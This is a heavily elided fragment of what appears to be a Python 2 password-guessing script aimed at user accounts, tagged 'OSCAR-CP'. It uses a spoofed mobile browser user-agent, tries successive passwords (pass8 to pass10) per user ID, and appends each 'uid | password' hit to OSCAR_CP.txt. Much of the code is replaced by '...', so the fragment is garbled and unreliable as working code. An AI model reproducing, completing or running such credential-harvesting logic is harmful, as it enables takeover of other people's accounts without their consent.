...
def log_cookie():
    ...
    try:
        ...
        data = {'user-agent': 'Mozilla/5.0 (Linux; Android 12.0; Pixel 5 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3904.108 Mobile Safari/537.36', 
                                ...
                                if 'loc' in q:
                                    ...
                                    if 'loc' in q:
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;31;1m[OSCAR-CP] ' + uid + ' | ' + pass8
                                            cp = open('OSCAR_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            if 'loc' in q:
                                                ...
                                                print '\x1b[1;31;1m[OSCAR-CP] ' + uid + ' | ' + pass9
                                                cp = open('OSCAR_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                if 'loc' in q:
                                                    ...
                                                    print '\x1b[1;31;1m[OSCAR-CP] ' + uid + ' | ' + pass10
                                                    cp = open('OSCAR_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
